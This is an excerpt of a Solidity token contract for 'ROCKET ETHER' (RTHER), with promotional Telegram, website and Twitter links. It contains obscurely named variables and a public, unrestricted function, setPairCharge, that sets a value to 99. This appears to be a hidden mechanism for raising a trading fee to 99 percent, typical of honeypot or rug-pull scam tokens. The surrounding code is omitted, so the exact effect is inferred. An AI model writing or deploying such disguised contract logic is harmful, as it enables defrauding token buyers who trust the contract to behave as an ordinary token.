...
// TG : https://t.me/RocketEther

// Website : https://RocketEther.club

// TW : https://twitter.com/RocketEther
...
contract RocketEther is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "ROCKET ETHER";
    string private constant _symbol = "RTHER";
    ...
    uint256 private NewValuation = NewDis;
    ...
    uint256[2][2] NewThreeD = [[99,3],[2,3]];
    ...
    function setPairCharge() public returns(bool) {
        NewDis = NewThreeD[0][0];
        return true;
    } 
